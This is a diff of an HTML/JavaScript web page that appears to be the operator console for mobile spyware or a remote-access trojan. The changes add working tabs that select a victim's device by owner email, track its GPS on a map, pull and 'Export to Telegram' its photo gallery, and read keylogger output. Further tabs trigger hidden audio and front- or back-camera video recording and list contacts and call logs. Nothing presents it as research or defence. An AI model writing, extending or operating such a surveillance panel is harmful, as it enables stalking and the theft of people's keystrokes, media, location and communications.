@@ -1,80 +1,331 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Admin Dashboard</title>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body { background:#0a0808; color:#eee; font-family: Arial; padding:20px; }
-        table { border-collapse: collapse; width:100%; margin-top:20px; }
-        th, td { border:1px solid #333; padding:8px; text-align:left; }
-        th { background:#1a1214; }
-        .toggle-btn { padding:5px 10px; cursor:pointer; border:none; border-radius:4px; }
-        .enabled { background:#35c76a; color:white; }
-        .disabled { background:#555; color:white; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin Panel - Neon</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: Arial, sans-serif; background:#0a0808; color:#eee; padding:20px; }
+.header { display:flex; align-items:center; gap:15px; flex-wrap:wrap; margin-bottom:20px; }
+.device-selector { background:#1a1214; border:1px solid #2d1d20; color:#fff; padding:10px; border-radius:8px; min-width:250px; }
+.controls { display:flex; gap:10px; flex-wrap:wrap; margin-bottom:20px; }
+.control-btn { background:transparent; color:#aaa; border:1px solid transparent; padding:10px 16px; cursor:pointer; border-radius:30px; transition:0.25s; }
+.control-btn:hover { background:rgba(255,50,55,0.08); color:#fff; }
+.control-btn.active { background:#ff3439; color:white; border-color:#ff3439; box-shadow:0 0 20px rgba(255,50,55,0.5); }
+.panel { border:1px solid #3b292d; border-radius:22px; background:rgba(18,12,14,0.9); padding:20px; margin-bottom:20px; }
+.panel-title { font-size:20px; font-weight:bold; margin-bottom:10px; }
+.stat-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(150px,1fr)); gap:10px; }
+.stat-card { background:#1a1214; border:1px solid #2d1d20; border-radius:10px; padding:15px; }
+.map-container { height:400px; border-radius:12px; overflow:hidden; border:1px solid #2d1d20; margin-top:10px; }
+#map { height:100%; }
+.keylog-box { max-height:400px; overflow-y:auto; background:#181214; border:1px solid #342326; border-radius:8px; padding:8px; }
+.keylog-entry { background:#120d10; border:1px solid #6f252c; border-radius:8px; padding:10px; margin-bottom:5px; }
+.media-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(150px,1fr)); gap:10px; }
+.media-card { background:#1a1214; border:1px solid #2d1d20; border-radius:8px; overflow:hidden; }
+.media-thumb { width:100%; height:120px; object-fit:cover; }
+.gallery-controls { display:flex; gap:10px; flex-wrap:wrap; margin-bottom:15px; }
+select, input { background:#1a1214; border:1px solid #2d1d20; color:#fff; padding:8px; border-radius:6px; }
+button { background:#ff3439; color:white; border:none; padding:8px 16px; border-radius:6px; cursor:pointer; }
+button:hover { opacity:0.8; }
+table { width:100%; border-collapse:collapse; margin-top:10px; }
+th, td { border:1px solid #333; padding:8px; text-align:left; }
+th { background:#1a1214; }
+</style>
 </head>
 <body>
-    <h1>Admin Dashboard</h1>
-    <button onclick="loadUsers()">Reload Users</button>
-    <button onclick="loadDevices()">Reload Devices</button>
 
-    <h2>Users</h2>
-    <div id="usersList"></div>
+<div class="header">
+    <h1>Admin Panel</h1>
+    <select id="deviceSelect" class="device-selector" onchange="onDeviceChange()">
+        <option value="">-- Select Device --</option>
+    </select>
+    <span id="deviceStatus"></span>
+</div>
 
-    <h2>Devices & Feature Control</h2>
-    <div id="devicesList"></div>
+<div class="controls" id="tabControls">
+    <button class="control-btn" onclick="showTab('apps', this)">▦ Installed Apps</button>
+    <button class="control-btn" onclick="showTab('gps', this)">📍 GPS Tracker</button>
+    <button class="control-btn" onclick="showTab('gallery', this)">🖼 Media Gallery</button>
+    <button class="control-btn" onclick="showTab('keylog', this)">⌨ Keylogger</button>
+    <button class="control-btn" onclick="showTab('audio', this)">🎤 Audio Recorder</button>
+    <button class="control-btn" onclick="showTab('video', this)">🎥 Video Recorder</button>
+    <button class="control-btn" onclick="showTab('contacts', this)">📞 Contacts</button>
+</div>
 
-    <script>
-        async function loadUsers() {
-            const res = await fetch('/api/admin/users');
-            const data = await res.json();
-            document.getElementById("usersList").innerHTML = data.users.map(u => 
-                `<div style="margin:5px 0;">${u.email} (${u.role})</div>`
-            ).join('');
-        }
+<!-- Installed Apps Panel -->
+<div class="panel" id="appsPanel" style="display:none;">
+    <div class="panel-title">▦ Installed Applications</div>
+    <div id="appsList">Select device first.</div>
+</div>
 
-        async function loadDevices() {
-            const res = await fetch('/api/admin/devices');
-            const data = await res.json();
-            const container = document.getElementById("devicesList");
-            container.innerHTML = '';
-            for (const d of data.devices) {
-                const features = ['gps','gallery','keylogger','audio','video','contacts'];
-                const featureToggles = features.map(f => `
-                    <td>
-                        <button class="toggle-btn ${d[f] ? 'enabled' : 'disabled'}" 
-                                onclick="toggleFeature('${d.device_id}', '${f}', ${!d[f]})">
-                            ${d[f] ? 'ON' : 'OFF'}
-                        </button>
-                    </td>
-                `).join('');
-                container.innerHTML += `
-                    <table style="margin-bottom:20px;">
-                        <tr>
-                            <th>Device ID</th><td>${d.device_id}</td>
-                            <th>Owner</th><td>${d.owner_email}</td>
-                        </tr>
-                        <tr>
-                            ${featureToggles}
-                        </tr>
-                    </table>
-                `;
-            }
-        }
+<!-- GPS Panel -->
+<div class="panel" id="gpsPanel" style="display:none;">
+    <div class="panel-title">📍 GPS Tracker</div>
+    <div class="stat-grid">
+        <div class="stat-card"><label>Latitude</label><div id="latValue">--</div></div>
+        <div class="stat-card"><label>Longitude</label><div id="lngValue">--</div></div>
+        <div class="stat-card"><label>Accuracy</label><div id="accuracyValue">--</div></div>
+        <div class="stat-card"><label>Last Update</label><div id="lastUpdateValue">--</div></div>
+    </div>
+    <button onclick="adminGpsRequest()">➤ Force GPS Update</button>
+    <div class="map-container"><div id="map"></div></div>
+</div>
 
-        async function toggleFeature(deviceId, feature, enabled) {
-            const res = await fetch('/api/admin/device-feature', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ deviceId, feature, enabled })
-            });
-            if (res.ok) loadDevices();
-            else alert('Failed to update feature.');
-        }
+<!-- Gallery Panel -->
+<div class="panel" id="galleryPanel" style="display:none;">
+    <div class="panel-title">🖼 Media Gallery</div>
+    <div class="gallery-controls">
+        <label>Count: </label>
+        <select id="galleryCountSelect">
+            <option value="10">10</option>
+            <option value="25">25</option>
+            <option value="50" selected>50</option>
+            <option value="100">100</option>
+        </select>
+        <button onclick="adminGalleryFetch()">⟳ Fetch Gallery</button>
+        <button onclick="adminExportGallery()">📤 Export to Telegram</button>
+    </div>
+    <div id="galleryGrid" class="media-grid"></div>
+</div>
 
-        loadUsers();
-        loadDevices();
-    </script>
+<!-- Keylogger Panel -->
+<div class="panel" id="keylogPanel" style="display:none;">
+    <div class="panel-title">⌨ Keylogger</div>
+    <button onclick="loadKeylog()">⟳ Refresh</button>
+    <div class="keylog-box" id="keylogContent"></div>
+</div>
+
+<!-- Audio Recorder Panel -->
+<div class="panel" id="audioPanel" style="display:none;">
+    <div class="panel-title">🎤 Audio Recorder</div>
+    <div class="gallery-controls">
+        <label>Duration (seconds): </label>
+        <select id="audioDurationSelect">
+            <option value="10">10s</option>
+            <option value="30">30s</option>
+            <option value="60" selected>1 min</option>
+            <option value="120">2 min</option>
+            <option value="300">5 min</option>
+        </select>
+        <button onclick="adminAudioRequest()">🎙 Start Recording</button>
+    </div>
+    <div id="audioStatus"></div>
+</div>
+
+<!-- Video Recorder Panel -->
+<div class="panel" id="videoPanel" style="display:none;">
+    <div class="panel-title">🎥 Video Recorder</div>
+    <div class="gallery-controls">
+        <label>Duration: </label>
+        <select id="videoDurationSelect">
+            <option value="5">5s</option>
+            <option value="10" selected>10s</option>
+            <option value="15">15s</option>
+            <option value="20">20s</option>
+            <option value="30">30s</option>
+        </select>
+        <label>Camera: </label>
+        <select id="cameraTypeSelect">
+            <option value="1" selected>Back</option>
+            <option value="0">Front</option>
+        </select>
+        <button onclick="adminVideoRequest()">🎥 Start Recording</button>
+    </div>
+    <div id="videoStatus"></div>
+</div>
+
+<!-- Contacts Panel -->
+<div class="panel" id="contactsPanel" style="display:none;">
+    <div class="panel-title">📞 Contacts & Call Logs</div>
+    <h3>Call Logs</h3>
+    <div id="callLogsList"></div>
+    <hr style="border-color:#333; margin:10px 0;">
+    <h3>Contacts</h3>
+    <div id="contactsList"></div>
+</div>
+
+<script>
+let currentDeviceId = null;
+let map;
+let marker;
+
+async function loadDevices() {
+    const res = await fetch('/api/admin/devices');
+    const data = await res.json();
+    const select = document.getElementById('deviceSelect');
+    select.innerHTML = '<option value="">-- Select Device --</option>';
+    data.devices.forEach(d => {
+        const opt = document.createElement('option');
+        opt.value = d.device_id;
+        opt.textContent = `${d.owner_email} - ${d.device_name} (${d.device_id})`;
+        select.appendChild(opt);
+    });
+}
+
+function onDeviceChange() {
+    currentDeviceId = document.getElementById('deviceSelect').value;
+    if (currentDeviceId) {
+        document.getElementById('deviceStatus').textContent = 'Selected: ' + currentDeviceId;
+        // সব প্যানেল রিসেট
+        document.querySelectorAll('.panel').forEach(p => p.style.display='none');
+        // ডিফল্ট GPS প্যানেল দেখান
+        showTab('gps', document.querySelector('.control-btn'));
+        loadDeviceInfo();
+        initMap();
+    }
+}
+
+function showTab(tabName, btn) {
+    // সব প্যানেল লুকান
+    document.querySelectorAll('.panel').forEach(p => p.style.display='none');
+    // ট্যাব হাইলাইট
+    document.querySelectorAll('.control-btn').forEach(b => b.classList.remove('active'));
+    if (btn) btn.classList.add('active');
+
+    switch(tabName) {
+        case 'apps': document.getElementById('appsPanel').style.display='block'; loadApps(); break;
+        case 'gps': document.getElementById('gpsPanel').style.display='block'; loadDeviceInfo(); break;
+        case 'gallery': document.getElementById('galleryPanel').style.display='block'; loadGallery(); break;
+        case 'keylog': document.getElementById('keylogPanel').style.display='block'; loadKeylog(); break;
+        case 'audio': document.getElementById('audioPanel').style.display='block'; break;
+        case 'video': document.getElementById('videoPanel').style.display='block'; break;
+        case 'contacts': document.getElementById('contactsPanel').style.display='block'; loadContacts(); break;
+    }
+}
+
+async function loadDeviceInfo() {
+    if (!currentDeviceId) return;
+    const res = await fetch(`/api/device-state?deviceId=${currentDeviceId}`);
+    const data = await res.json();
+    document.getElementById('latValue').textContent = data.latitude ?? '--';
+    document.getElementById('lngValue').textContent = data.longitude ?? '--';
+    document.getElementById('accuracyValue').textContent = data.accuracy ? data.accuracy + ' m' : '--';
+    document.getElementById('lastUpdateValue').textContent = data.last_seen ? new Date(data.last_seen).toLocaleTimeString() : '--';
+    if (data.latitude && data.longitude) {
+        updateMap(data.latitude, data.longitude);
+    }
+}
+
+function initMap() {
+    if (map) return;
+    map = L.map('map').setView([23.8103, 90.4125], 13);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        attribution: '&copy; OpenStreetMap contributors'
+    }).addTo(map);
+}
+
+function updateMap(lat, lng) {
+    if (!map) initMap();
+    if (marker) map.removeLayer(marker);
+    marker = L.marker([lat, lng]).addTo(map);
+    map.flyTo([lat, lng], 15);
+}
+
+async function loadApps() {
+    if (!currentDeviceId) return;
+    const res = await fetch(`/api/device-state?deviceId=${currentDeviceId}`);
+    const data = await res.json();
+    const apps = data.installedApps || [];
+    document.getElementById('appsList').innerHTML = apps.length ? apps.map(a => `<div>${a.name} (${a.package})</div>`).join('') : 'No apps.';
+}
+
+async function adminGpsRequest() {
+    if (!currentDeviceId) return alert('Select a device first.');
+    const res = await fetch('/api/admin/gps/request', {
+        method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({deviceId:currentDeviceId})
+    });
+    const data = await res.json();
+    alert(data.success ? 'GPS request sent.' : 'Failed.');
+}
+
+async function adminGalleryFetch() {
+    if (!currentDeviceId) return alert('Select a device first.');
+    const count = parseInt(document.getElementById('galleryCountSelect').value);
+    const res = await fetch('/api/admin/gallery/request', {
+        method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({deviceId:currentDeviceId, count})
+    });
+    const data = await res.json();
+    if (data.success) {
+        // অপেক্ষা করে গ্যালারি লোড করা যায়
+        setTimeout(async () => { await loadGallery(); }, 5000);
+        alert('Gallery fetch requested.');
+    } else alert('Failed: ' + data.error);
+}
+
+async function loadGallery() {
+    if (!currentDeviceId) return;
+    const res = await fetch(`/api/gallery?deviceId=${currentDeviceId}`);
+    const data = await res.json();
+    const media = data.media || [];
+    document.getElementById('galleryGrid').innerHTML = media.map(item => `
+        <div class="media-card">
+            ${item.thumbnailBase64 ? `<img src="data:image/jpeg;base64,${item.thumbnailBase64}" class="media-thumb">` : '<div style="height:120px; display:flex; align-items:center; justify-content:center;">No Thumb</div>'}
+            <div style="padding:5px; font-size:10px;">${item.filename}</div>
+        </div>
+    `).join('');
+}
+
+async function adminExportGallery() {
+    if (!currentDeviceId) return alert('Select a device first.');
+    const res = await fetch('/api/admin/gallery/export', {
+        method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({deviceId:currentDeviceId})
+    });
+    const data = await res.json();
+    alert(data.success ? data.message : 'Export failed: ' + data.error);
+}
+
+async function loadKeylog() {
+    if (!currentDeviceId) return;
+    const res = await fetch(`/api/keylog?deviceId=${currentDeviceId}`);
+    const logs = await res.json();
+    document.getElementById('keylogContent').innerHTML = logs.length ? logs.reverse().map(l => `
+        <div class="keylog-entry"><div>${l.text}</div><div style="color:#888; font-size:12px;">${new Date(l.timestamp).toLocaleString()}</div></div>
+    `).join('') : 'No keylogs.';
+}
+
+async function adminAudioRequest() {
+    if (!currentDeviceId) return alert('Select a device first.');
+    const duration = parseInt(document.getElementById('audioDurationSelect').value);
+    const res = await fetch('/api/admin/audio/request', {
+        method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({deviceId:currentDeviceId, duration})
+    });
+    const data = await res.json();
+    document.getElementById('audioStatus').textContent = data.success ? `Recording requested for ${duration}s.` : 'Failed: ' + data.error;
+}
+
+async function adminVideoRequest() {
+    if (!currentDeviceId) return alert('Select a device first.');
+    const duration = parseInt(document.getElementById('videoDurationSelect').value);
+    const cameraType = parseInt(document.getElementById('cameraTypeSelect').value);
+    const res = await fetch('/api/admin/video/request', {
+        method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({deviceId:currentDeviceId, duration, cameraType})
+    });
+    const data = await res.json();
+    document.getElementById('videoStatus').textContent = data.success ? `Recording requested for ${duration}s.` : 'Failed: ' + data.error;
+}
+
+async function loadContacts() {
+    if (!currentDeviceId) return;
+    const callRes = await fetch(`/api/calllogs?deviceId=${currentDeviceId}`);
+    const callData = await callRes.json();
+    const callLogs = callData.callLogs || [];
+    document.getElementById('callLogsList').innerHTML = callLogs.length ? callLogs.map(c => `
+        <div>${c.name} (${c.number}) - ${c.type} - ${c.duration}s</div>
+    `).join('') : 'No call logs.';
+
+    const conRes = await fetch(`/api/contacts?deviceId=${currentDeviceId}`);
+    const conData = await conRes.json();
+    const contacts = conData.contacts || [];
+    document.getElementById('contactsList').innerHTML = contacts.length ? contacts.map(c => `
+        <div>${c.name} — ${c.number}</div>
+    `).join('') : 'No contacts.';
+}
+
+// Initial load
+loadDevices();
+</script>
 </body>
 </html>
